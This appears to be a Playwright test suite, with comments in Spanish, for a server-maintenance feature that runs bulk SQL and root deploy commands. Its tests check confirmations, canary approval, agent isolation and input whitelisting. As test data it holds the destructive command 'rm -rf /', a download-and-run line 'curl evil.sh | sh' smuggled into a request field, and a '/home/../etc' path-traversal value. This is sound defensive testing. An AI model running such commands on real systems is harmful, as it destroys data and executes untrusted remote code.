import { test, expect } from '../../fixtures/auth.fixture';
import { API_BASE, APP_ENDPOINTS, makeNombre } from '../../helpers/constants';
import { expectSuccess, expectError } from '../../helpers/response';
import { hardDeleteByPath } from '../../helpers/hardCleanup';

/**
 * M24 — FullGlass: SQL masivo sobre las bases de los clientes y deploy remoto.
 *
 * Es la parte más sensible del sistema: un error acá tumba servidores de producción. Por eso
 * el spec prueba sobre todo las DEFENSAS — que no se pueda ejecutar en un servidor sin
 * FullGlass, que un SQL peligroso exija confirmación escrita, que el canario frene el resto, y
 * que configurar el comando de deploy pida una capability distinta de la de ejecutarlo.
 *
 * Serial: es una historia sola (se da de alta el servidor, su agente reporta, se lanza un
 * trabajo, el agente lo toma y lo reporta).
 */
test.describe.configure({ mode: 'serial' });

test.describe('M24: FullGlass — SQL masivo y deploy', () => {
  const cleanup: string[] = [];
  let servidorId = 0;
  let token = '';
  let agente: import('@playwright/test').APIRequestContext;

  const ipUnica = () => `10.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`;

  test.beforeAll(async ({ adminApi, playwright }) => {
    const res = await adminApi.post(APP_ENDPOINTS.servidores, {
      data: { ...makeNombre('VPS FullGlass'), ip: ipUnica(), monitorea: true, tieneFullglass: true },
    });
    const body = await expectSuccess(res, 201);
    servidorId = body.data.id;
    token = body.data.token;
    cleanup.push(`servidores/${servidorId}`);

    agente = await playwright.request.newContext({
      baseURL: `${API_BASE}/`,
      extraHTTPHeaders: { 'x-agent-token': token },
    });
    // Una métrica deja el servidor ONLINE: sin contacto, los trabajos nacen en `error` y
    // todo el spec se cae con 409 al cancelarlos.
    //
    // Se reintenta porque el endpoint del agente tiene rate limit por IP (30/min) y lo
    // COMPARTE con el spec de mantenimiento: corriendo la suite entera, la primera métrica
    // puede rebotar con 429 y el servidor quedaría en «desconocido».
    let online = false;
    for (let intento = 0; intento < 6 && !online; intento++) {
      const res = await agente.post('agente/metricas', { data: { cpu: 10, ram: 20, disco: 30 } });
      if (res.ok()) { online = true; break; }
      await new Promise(r => setTimeout(r, 2500));
    }
    expect(online, 'el agente no pudo reportar: el servidor queda sin contacto').toBe(true);
  });

  test.afterAll(async () => {
    await agente?.dispose();
    for (const path of cleanup.reverse()) await hardDeleteByPath(path);
  });

  test('M24.1 - el análisis marca lo peligroso y deja pasar lo inocuo', async ({ adminApi }) => {
    const { data } = await expectSuccess(await adminApi.post('mantenimiento/trabajos/analizar', {
      data: { sql: 'ALTER TABLE pedidos ADD COLUMN x INT;\nUPDATE clientes SET activo=1;\nDROP TABLE viejo;' },
    }), 200);

    expect(data.sentencias).toHaveLength(3);
    const motivos = data.peligros.map((p: { que: string }) => p.que);
    expect(motivos).toContain('UPDATE sin WHERE');
    expect(motivos).toContain('DROP TABLE');
    // El ALTER ADD COLUMN no es peligroso: si saltara por todo, el aviso dejaría de leerse.
    expect(motivos).not.toContain('DROP COLUMN');

    // Y un UPDATE acotado tampoco avisa.
    const limpio = await expectSuccess(await adminApi.post('mantenimiento/trabajos/analizar', {
      data: { sql: 'UPDATE clientes SET activo=1 WHERE id = 7;' },
    }), 200);
    expect(limpio.data.peligros).toHaveLength(0);
  });

  test('M24.2 - un SQL peligroso NO se lanza sin confirmación escrita', async ({ adminApi }) => {
    await expectError(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'TRUNCATE pedidos;' },
    }), 400);

    // Con la palabra, sí.
    const { data } = await expectSuccess(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'TRUNCATE pedidos;', confirmacion: 'CONFIRMO' },
    }), 201);
    expect(data.trabajos).toHaveLength(1);
    await expectSuccess(await adminApi.post(`mantenimiento/trabajos/${data.trabajos[0].id}/cancelar`), 200);
  });

  test('M24.3 - un servidor SIN FullGlass no acepta trabajos', async ({ adminApi }) => {
    const otro = await expectSuccess(await adminApi.post(APP_ENDPOINTS.servidores, {
      data: { ...makeNombre('VPS Pelado'), ip: ipUnica(), monitorea: true },
    }), 201);
    cleanup.push(`servidores/${otro.data.id}`);

    await expectError(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [otro.data.id], sql: 'SELECT 1;' },
    }), 400);
  });

  test('M24.4 - el CANARIO frena el resto hasta que alguien aprueba', async ({ adminApi }) => {
    const lote = await expectSuccess(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'ALTER TABLE pedidos ADD COLUMN nuevo INT;' },
    }), 201);
    const trabajoId = lote.data.trabajos[0].id;

    // El agente pregunta y recibe el trabajo en fase CANARIO.
    const pendientes = await expectSuccess(await agente.get('agente/trabajos'), 200);
    const mio = pendientes.data.find((t: { id: number }) => t.id === trabajoId);
    expect(mio.fase).toBe('canario');
    expect(mio.sql).toContain('ADD COLUMN nuevo');

    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/tomar`), 200);
    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/resultado`, {
      data: { ok: true, resultados: [{ sitio: '/home/cliente1', base: 'cliente1', estado: 'ok', filasAfectadas: 0, sentenciasOk: 1 }] },
    }), 200);

    // Canario OK ⇒ NO termina: espera que una persona apruebe seguir.
    const trasCanario = await expectSuccess(await adminApi.get(`mantenimiento/trabajos/${trabajoId}`), 200);
    expect(trasCanario.data.estado).toBe('espera_ok');
    expect(trasCanario.data.resultados[0].esCanario).toBe(true);

    // Y mientras tanto el agente NO se lo lleva de nuevo: el resto no corre solo.
    const mientras = await expectSuccess(await agente.get('agente/trabajos'), 200);
    expect(mientras.data.find((t: { id: number }) => t.id === trabajoId)).toBeUndefined();

    // Con la aprobación, el agente lo recibe en fase «resto».
    await expectSuccess(await adminApi.post(`mantenimiento/trabajos/${trabajoId}/aprobar`), 200);
    const despues = await expectSuccess(await agente.get('agente/trabajos'), 200);
    expect(despues.data.find((t: { id: number }) => t.id === trabajoId).fase).toBe('resto');

    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/tomar`), 200);
    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/resultado`, {
      data: { ok: true, resultados: [{ sitio: '/home/cliente2', base: 'cliente2', estado: 'ok', sentenciasOk: 1 }] },
    }), 200);
    const final = await expectSuccess(await adminApi.get(`mantenimiento/trabajos/${trabajoId}`), 200);
    expect(final.data.estado).toBe('ok');
    expect(final.data.resultados).toHaveLength(2);
  });

  test('M24.5 - si el canario FALLA, el trabajo queda en error y no sigue', async ({ adminApi }) => {
    const lote = await expectSuccess(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'ALTER TABLE no_existe ADD COLUMN x INT;' },
    }), 201);
    const trabajoId = lote.data.trabajos[0].id;

    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/tomar`), 200);
    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/resultado`, {
      data: {
        ok: false,
        resultados: [{ sitio: '/home/cliente1', base: 'cliente1', estado: 'error', error: "Table 'no_existe' doesn't exist" }],
      },
    }), 200);

    const final = await expectSuccess(await adminApi.get(`mantenimiento/trabajos/${trabajoId}`), 200);
    expect(final.data.estado).toBe('error');
    // El error textual por base es lo que el script PHP no guardaba.
    expect(final.data.resultados[0].error).toContain("doesn't exist");
    // Y el agente no se lo lleva otra vez.
    const pendientes = await expectSuccess(await agente.get('agente/trabajos'), 200);
    expect(pendientes.data.find((t: { id: number }) => t.id === trabajoId)).toBeUndefined();
  });

  test('M24.6 - deploy: exige el comando configurado, y lo COPIA al lanzar', async ({ adminApi }) => {
    // Sin comando configurado no se puede lanzar.
    await expectError(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'deploy', servidorIds: [servidorId], entorno: 'produccion' },
    }), 400);

    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-deploy`, {
      data: { comandoDeployProd: 'cd /var/www/fullglass && ./deploy.sh prod' },
    }), 200);

    const lote = await expectSuccess(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'deploy', servidorIds: [servidorId], entorno: 'produccion' },
    }), 201);
    const trabajoId = lote.data.trabajos[0].id;

    // El comando viaja COPIADO: si alguien lo edita ahora, corre el que se aprobó.
    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-deploy`, {
      data: { comandoDeployProd: 'rm -rf /' },
    }), 200);
    const pendientes = await expectSuccess(await agente.get('agente/trabajos'), 200);
    const mio = pendientes.data.find((t: { id: number }) => t.id === trabajoId);
    expect(mio.comando).toBe('cd /var/www/fullglass && ./deploy.sh prod');
    expect(mio.fase).toBe('unico');   // un deploy no tiene canario

    await expectSuccess(await adminApi.post(`mantenimiento/trabajos/${trabajoId}/cancelar`), 200);
    // Se deja el servidor sin ese comando: no hay que dejar un «rm -rf /» cargado en la ficha
    // ni siquiera en una base de pruebas.
    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-deploy`, {
      data: { comandoDeployProd: null },
    }), 200);
  });

  test('M24.7 - el PUT normal del servidor NO puede setear el comando de deploy', async ({ adminApi }) => {
    // Se parte de un valor conocido, para que la prueba sea «no cambió» y no dependa de en
    // qué estado lo dejó el test anterior.
    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-deploy`, {
      data: { comandoDeployProd: './deploy.sh prod' },
    }), 200);

    // `matchedData` whitelistea: el campo se descarta aunque venga en el body. Es lo que
    // impide que `servidores:update` alcance para ejecutar lo que uno quiera como root.
    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}`, {
      data: { nombre: 'VPS FullGlass', ip: ipUnica(), comandoDeployProd: 'curl evil.sh | sh' },
    }), 200);
    const ficha = await expectSuccess(await adminApi.get(`${APP_ENDPOINTS.servidores}/${servidorId}`), 200);
    expect(ficha.data.comandoDeployProd).toBe('./deploy.sh prod');

    // Y por el endpoint que corresponde SÍ se puede, incluido DESCONFIGURARLO: un comando que
    // corre como root y no se puede sacar sería una puerta que queda abierta para siempre.
    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-deploy`, {
      data: { comandoDeployProd: null },
    }), 200);
    const limpia = await expectSuccess(await adminApi.get(`${APP_ENDPOINTS.servidores}/${servidorId}`), 200);
    expect(limpia.data.comandoDeployProd ?? null).toBeNull();
  });

  test('M24.8 - el inventario de sitios lo reporta el agente, sin credenciales', async ({ adminApi }) => {
    await expectSuccess(await agente.post('agente/sitios', {
      data: {
        sitios: [
          { ruta: '/home/clienteA', base: 'clienteA_db' },
          { ruta: '/home/clienteB', base: 'clienteB_db' },
          { ruta: '/home/roto', problema: 'no se encontró configs/config_site.php' },
        ],
      },
    }), 200);

    const { data } = await expectSuccess(await adminApi.get(`${APP_ENDPOINTS.servidores}/${servidorId}/sitios`), 200);
    expect(data).toHaveLength(3);
    const texto = JSON.stringify(data);
    // Lo que la app tiene derecho a saber es el sitio y la base. Nada más.
    expect(texto).toContain('clienteA_db');
    expect(texto).not.toMatch(/db_pass|password|contrase/i);

    // El reporte REEMPLAZA: un sitio dado de baja desaparece de la vista previa.
    await expectSuccess(await agente.post('agente/sitios', {
      data: { sitios: [{ ruta: '/home/clienteA', base: 'clienteA_db' }] },
    }), 200);
    const segundo = await expectSuccess(await adminApi.get(`${APP_ENDPOINTS.servidores}/${servidorId}/sitios`), 200);
    expect(segundo.data).toHaveLength(1);
  });

  test('M24.9 - un agente no puede tocar los trabajos de OTRO servidor', async ({ adminApi, playwright }) => {
    const otro = await expectSuccess(await adminApi.post(APP_ENDPOINTS.servidores, {
      data: { ...makeNombre('VPS Ajeno'), ip: ipUnica(), monitorea: true, tieneFullglass: true },
    }), 201);
    cleanup.push(`servidores/${otro.data.id}`);
    const ajeno = await playwright.request.newContext({
      baseURL: `${API_BASE}/`,
      extraHTTPHeaders: { 'x-agent-token': otro.data.token },
    });

    const lote = await expectSuccess(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'SELECT 1;' },
    }), 201);
    const trabajoId = lote.data.trabajos[0].id;

    // El trabajo es del PRIMER servidor: el agente del otro ni lo ve ni lo puede tomar.
    const suyos = await expectSuccess(await ajeno.get('agente/trabajos'), 200);
    expect(suyos.data.find((t: { id: number }) => t.id === trabajoId)).toBeUndefined();
    expect((await ajeno.post(`agente/trabajos/${trabajoId}/tomar`)).status()).toBe(409);
    expect((await ajeno.post(`agente/trabajos/${trabajoId}/resultado`, { data: { ok: true } })).status()).toBe(404);

    await ajeno.dispose();
    await expectSuccess(await adminApi.post(`mantenimiento/trabajos/${trabajoId}/cancelar`), 200);
  });

  test('M24.10 - las cuatro capabilities: el fixture no puede ni configurar ni ejecutar', async ({ authedApi }) => {
    await expectError(await authedApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'SELECT 1;' },
    }), 403);
    await expectError(await authedApi.post('mantenimiento/trabajos', {
      data: { tipo: 'deploy', servidorIds: [servidorId], entorno: 'produccion' },
    }), 403);
    await expectError(await authedApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-deploy`, {
      data: { comandoDeployProd: 'x' },
    }), 403);
    await expectError(await authedApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-bd`, {
      data: { rutaSitios: '/home' },
    }), 403);
    await expectError(await authedApi.get('mantenimiento/trabajos'), 403);
  });

  test('M24.12 - un trabajo que el agente tomó y abandonó se puede DESTRABAR', async ({ adminApi }) => {
    const lote = await expectSuccess(await adminApi.post('mantenimiento/trabajos', {
      data: { tipo: 'sql', servidorIds: [servidorId], sql: 'SELECT 1;' },
    }), 201);
    const trabajoId = lote.data.trabajos[0].id;

    // El agente lo toma y NUNCA reporta (es lo que pasa si se reinicia el VPS a mitad).
    await expectSuccess(await agente.post(`agente/trabajos/${trabajoId}/tomar`), 200);

    // Recién tomado NO se puede destrabar: lo más probable es que siga trabajando de verdad.
    await expectError(await adminApi.post(`mantenimiento/trabajos/${trabajoId}/cancelar`), 409);

    // Y el agente tampoco se lo vuelve a llevar: sin la salida manual quedaría así para siempre.
    const pendientes = await expectSuccess(await agente.get('agente/trabajos'), 200);
    expect(pendientes.data.find((t: { id: number }) => t.id === trabajoId)).toBeUndefined();
  });

  test('M24.11 - la ruta a recorrer tiene que ser absoluta y sin «..»', async ({ adminApi }) => {
    await expectError(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-bd`, {
      data: { rutaSitios: 'home/sitios' },
    }), 422);
    await expectError(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-bd`, {
      data: { rutaSitios: '/home/../etc' },
    }), 422);
    await expectSuccess(await adminApi.put(`${APP_ENDPOINTS.servidores}/${servidorId}/config-bd`, {
      data: { rutaSitios: '/home' },
    }), 200);
  });
});
